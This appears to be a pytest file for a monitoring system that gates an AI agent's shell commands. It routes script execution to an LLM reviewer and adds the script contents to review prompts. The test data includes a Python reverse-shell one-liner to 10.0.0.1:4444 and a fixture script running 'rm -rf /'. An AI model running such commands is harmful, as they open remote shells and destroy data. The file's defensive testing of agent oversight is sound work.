"""Tests for the script-execution denylist rule and script visibility in review prompts."""

import pytest

from cross.evaluator import Action, EvaluationResponse, GateRequest
from cross.gates.denylist import DenylistGate
from cross.gates.llm_review import _format_review_prompt
from cross.sentinels.llm_reviewer import _format_event_for_review


def _req(tool_name: str, tool_input: dict) -> GateRequest:
    return GateRequest(tool_name=tool_name, tool_input=tool_input)


class TestScriptExecutionRule:
    """Test that script execution triggers REVIEW (for LLM gate review)."""

    def setup_method(self):
        self.gate = DenylistGate()

    @pytest.mark.anyio
    async def test_python_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "python script.py"}))
        assert r.action == Action.REVIEW
        assert r.rule_id == "script-execution"

    @pytest.mark.anyio
    async def test_python3_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "python3 bad_script.py"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_python_with_path(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "python ./scripts/deploy.py"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_python_with_flags(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "python3 -u script.py"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_node_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "node server.js"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_node_ts_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "node app.ts"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_ruby_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "ruby deploy.rb"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_perl_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "perl process.pl"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_bash_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "bash setup.sh"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_sh_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "sh install.sh"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_php_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "php index.php"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_rscript(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "Rscript analysis.R"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_lua_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "lua script.lua"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_dotslash_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "./deploy.py"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_chained_script_execution(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "cd /tmp && python exploit.py"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_env_python_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "env python script.py"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_exec_python_script(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "exec python3 script.py"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_stdin_redirect(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "python < script.py"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_cat_pipe_to_python(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "cat script.py | python"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_safe_python_module_allowed(self):
        """python -m pytest should NOT trigger the script-execution rule."""
        r = await self.gate.evaluate(_req("Bash", {"command": "python -m pytest tests/"}))
        assert r.action == Action.ALLOW

    @pytest.mark.anyio
    async def test_python_inline_reviewed(self):
        """python -c 'code' should trigger review via the script-execution rule."""
        r = await self.gate.evaluate(_req("Bash", {"command": "python -c 'print(1)'"}))
        assert r.action == Action.REVIEW

    @pytest.mark.anyio
    async def test_git_status_still_allowed(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "git status"}))
        assert r.action == Action.ALLOW

    @pytest.mark.anyio
    async def test_npm_install_still_allowed(self):
        r = await self.gate.evaluate(_req("Bash", {"command": "npm install"}))
        assert r.action == Action.ALLOW

    @pytest.mark.anyio
    async def test_higher_severity_wins(self):
        """If a command matches both script-execution and a higher-severity rule, the higher wins."""
        r = await self.gate.evaluate(
            _req("Bash", {"command": "python3 -c 'import socket; s=socket.socket(); s.connect((\"10.0.0.1\",4444))'"})
        )
        assert r.action == Action.HALT_SESSION  # reverse-shell rule wins


class TestScriptContentsInGatePrompt:
    """Test that script contents appear in the LLM gate review prompt."""

    def test_script_contents_included(self):
        req = GateRequest(
            tool_name="Bash",
            tool_input={"command": "python script.py"},
            script_contents={"/home/user/script.py": "import os\nos.system('rm -rf /')\n"},
            prior_result=EvaluationResponse(
                action=Action.ESCALATE,
                reason="Script execution",
                rule_id="script-execution",
                evaluator="denylist",
            ),
        )
        prompt = _format_review_prompt(req)
        assert "Script file contents:" in prompt
        assert "/home/user/script.py" in prompt
        assert "os.system('rm -rf /')" in prompt

    def test_no_script_contents_omits_section(self):
        req = GateRequest(
            tool_name="Bash",
            tool_input={"command": "git status"},
        )
        prompt = _format_review_prompt(req)
        assert "Script file contents" not in prompt

    def test_empty_script_contents_omits_section(self):
        req = GateRequest(
            tool_name="Bash",
            tool_input={"command": "python nonexistent.py"},
            script_contents={},
        )
        prompt = _format_review_prompt(req)
        assert "Script file contents" not in prompt


class TestScriptContentsInSentinelEvents:
    """Test that script contents appear in sentinel event formatting."""

    def test_tool_use_with_script_contents(self):
        event = {
            "type": "tool_use",
            "name": "Bash",
            "input": {"command": "python script.py"},
            "script_contents": {"/home/user/script.py": "print('hello')"},
        }
        result = _format_event_for_review(event)
        assert "[script: /home/user/script.py]" in result
        assert "print('hello')" in result

    def test_gate_decision_omits_script_contents(self):
        """Gate decision events don't duplicate script contents (shown in tool_use event)."""
        event = {
            "type": "gate_decision",
            "tool_name": "Bash",
            "action": "escalate",
            "reason": "Script execution",
            "evaluator": "denylist",
            "input": {"command": "python script.py"},
            "script_contents": {"/home/user/script.py": "import subprocess"},
        }
        result = _format_event_for_review(event)
        assert "[script:" not in result  # deduped — shown in tool_use event instead

    def test_event_without_script_contents(self):
        event = {
            "type": "tool_use",
            "name": "Bash",
            "input": {"command": "ls"},
        }
        result = _format_event_for_review(event)
        assert "[script:" not in result
